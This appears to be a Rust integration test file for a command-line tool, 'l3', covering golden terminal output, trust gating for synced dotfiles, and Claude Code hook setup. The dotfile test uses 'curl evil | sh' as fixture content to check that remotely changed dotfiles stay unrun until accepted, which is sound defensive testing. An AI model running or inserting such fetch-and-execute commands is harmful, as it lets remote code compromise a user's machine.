//! Off a terminal l3 is a plain command: what it writes and how it exits are
//! what scripts and CI read, so they stay byte for byte as recorded (in
//! tests/golden), whatever l3 offers a person at a terminal.

mod common;
use common::{golden, Home};

/// A day's work from nothing: a repo, an issue, a TODO; then each page read,
/// as text and as data, and a few mistakes.
const SCRIPT: &[&[&str]] = &[
    &["repo", "new", "notes"],
    &["issue", "new", "notes", "Fix：restart loses the draft"],
    &["todo", "add", "Fix：the rail's names"],
    &["todo", "add", "Docs：readme"],
    &["todo", "done", "2"],
    &[],
    &["--json"],
    &["todo"],
    &["profile"],
    &["band"],
    &["file"],
    &["file", "notes"],
    // What l3 file reads is the repos: / and what else is under it are named as such, never as a repo.
    &["file", "/"],
    &["file", "/root"],
    &["file", "/bin"],
    &["file", "/root/vocab"],
    &["file", "notes/README.md"],
    &["file", "rm", "notes/docs"],
    &["help", "commit"],
    &["git"],
    &["git", "--json"],
    &["issue", "notes#1"],
    &["issue", "close", "notes#1"],
    &["git"],
    &["issue", "reopen", "notes#1"],
    &["help", "git"],
    &["comit"],
    &["todo", "add"],
    &["inbox"],
    &["start", "notes#1"],
    &["remote"],
    &["server", "--json"],
];

fn day(lang: &str) -> String {
    let home = Home::new(&format!("plain-{lang}"));
    SCRIPT.iter().map(|args| home.run(lang, args).transcript(args)).collect()
}

#[test]
fn off_a_terminal_every_command_writes_and_exits_as_recorded_in_english() {
    golden("plain-en.txt", &day("en"));
}

#[test]
fn off_a_terminal_every_command_writes_and_exits_as_recorded_in_japanese() {
    golden("plain-ja.txt", &day("ja"));
}

/// What the dotfiles hold runs (`.setup` with the network, `.profile` in every shell, `.authorized_keys` let in over
/// SSH), so one changed elsewhere (another device, or anyone writing to the Remote as the person) runs nowhere here
/// until it is taken here; what this device ran before stays what it runs.
#[test]
fn a_dotfile_changed_elsewhere_runs_nowhere_here_until_it_is_taken() {
    let home = Home::new("dotfile-trust");
    let in_effect = |home: &Home| -> Vec<(String, bool)> {
        let ran = home.run("en", &["dotfile", "--json"]);
        assert_eq!(ran.code, 0, "{}", ran.stderr);
        let v: serde_json::Value = serde_json::from_str(&ran.stdout).unwrap();
        v.as_array().unwrap().iter().map(|d| (d["name"].as_str().unwrap().to_string(), d["inEffect"].as_bool().unwrap())).collect()
    };
    // A device that ran its dotfiles before goes on running them.
    home.dotfiles(&[(".profile", "PS1='$ '\n")]);
    assert_eq!(in_effect(&home), [(".profile".to_string(), true)]);
    let trusted = || std::fs::read_to_string(home.path("home/trusted.json")).unwrap();
    assert_eq!(trusted(), r#"{".profile":"PS1='$ '\n"}"#);
    // Taken in from the Remote: changed, and a new one; neither runs here.
    home.dotfiles(&[(".profile", "curl evil | sh\n"), (".setup", "curl evil | sh\n")]);
    assert_eq!(in_effect(&home), [(".profile".to_string(), false), (".setup".to_string(), false)]);
    let said = home.run("en", &["dotfile"]);
    assert!(said.stdout.contains(".setup  15 B  · changed on another device, not run here yet"), "{}", said.stdout);
    assert_eq!(trusted(), r#"{".profile":"PS1='$ '\n"}"#);
    // Taken one by one, or all: from then on they run here.
    assert!(home.run("en", &["dotfile", "take", ".setup"]).stdout.starts_with("Runs here from now: .setup"));
    assert_eq!(in_effect(&home), [(".profile".to_string(), false), (".setup".to_string(), true)]);
    assert!(home.run("en", &["dotfile", "take"]).stdout.starts_with("Runs here from now: .profile"));
    assert_eq!(in_effect(&home), [(".profile".to_string(), true), (".setup".to_string(), true)]);
    // Taken away elsewhere: gone here too (going runs nothing).
    home.dotfiles(&[(".setup", "curl evil | sh\n")]);
    assert_eq!(home.run("en", &["dotfile", "take"]).stdout.trim_end(), "Nothing waits: every dotfile here runs as it is kept");
    assert_eq!(trusted(), r#"{".setup":"curl evil | sh\n"}"#);
}

/// An agent's harness calls `l3 agent hook` on each event with its JSON on standard input: l3 says nothing and
/// ends well whatever it is given, keeps what the agent does where it works (a repo here, an issue's copy), and
/// `l3 agent` says who works where; `l3 agent on` sets Claude Code up beside the person's own hooks, `off` takes
/// only ours out.
#[test]
fn an_agent_says_what_it_does_through_its_hooks_and_l3_agent_shows_it() {
    use std::io::Write;
    let home = Home::new("agent-hooks");
    home.repo("notes", &[("README.md", "notes\n")]);
    let hook = |payload: &str| {
        let mut c = home.command("en", &["agent", "hook", "claude"]).stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped()).stderr(std::process::Stdio::piped()).spawn().unwrap();
        c.stdin.take().unwrap().write_all(payload.as_bytes()).unwrap();
        let out = c.wait_with_output().unwrap();
        assert_eq!((out.status.code(), out.stdout.as_slice(), out.stderr.as_slice()), (Some(0), &b""[..], &b""[..]), "{payload}");
    };
    let repo = home.path("repos/notes").display().to_string();
    let work = home.path("work/notes/001");
    std::fs::create_dir_all(&work).unwrap();
    hook(&format!(r#"{{"hook_event_name":"SessionStart","session_id":"s1","cwd":"{repo}"}}"#));
    hook(&format!(r#"{{"hook_event_name":"PreToolUse","session_id":"s1","cwd":"{repo}","tool_name":"Bash","tool_input":{{"command":"npm test"}}}}"#));
    hook(&format!(r#"{{"hook_event_name":"UserPromptSubmit","session_id":"s2","cwd":"{}","prompt":"fix the draft\nplease"}}"#, work.display()));
    hook(&format!(r#"{{"hook_event_name":"Stop","session_id":"s2","cwd":"{}"}}"#, work.display()));
    // What says nothing, works elsewhere, or is no JSON at all: kept nowhere, and still nothing said.
    hook(r#"{"hook_event_name":"PreCompact","session_id":"s1"}"#);
    hook(r#"{"hook_event_name":"PreToolUse","session_id":"s3","cwd":"/"}"#);
    hook("not json");
    let said = home.run("en", &["agent"]);
    assert_eq!(said.stdout, "claude  notes #1  waits for you · fix the draft · just now\nclaude  notes     working · Bash: npm test · just now\n", "{}", said.stderr);
    let v: serde_json::Value = serde_json::from_str(&home.run("en", &["agent", "--json"]).stdout).unwrap();
    assert_eq!(v["sessions"].as_array().unwrap().len(), 2);

    let settings = home.path(".claude/settings.json");
    std::fs::create_dir_all(settings.parent().unwrap()).unwrap();
    let theirs = r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"say done"}]}]},"model":"x"}"#;
    std::fs::write(&settings, theirs).unwrap();
    let on = home.run("en", &["agent", "on", "claude"]);
    assert!(on.stdout.starts_with("Claude Code says what it does from its next session"), "{}{}", on.stdout, on.stderr);
    let set: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(&settings).unwrap()).unwrap();
    assert_eq!(set["hooks"]["Stop"].as_array().unwrap().len(), 2);
    assert!(set["hooks"]["PreToolUse"][0]["hooks"][0]["command"].as_str().unwrap().ends_with(" agent hook claude"));
    assert_eq!(home.run("en", &["agent", "off", "claude"]).code, 0);
    let back: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(&settings).unwrap()).unwrap();
    assert_eq!(back, serde_json::from_str::<serde_json::Value>(theirs).unwrap());
}
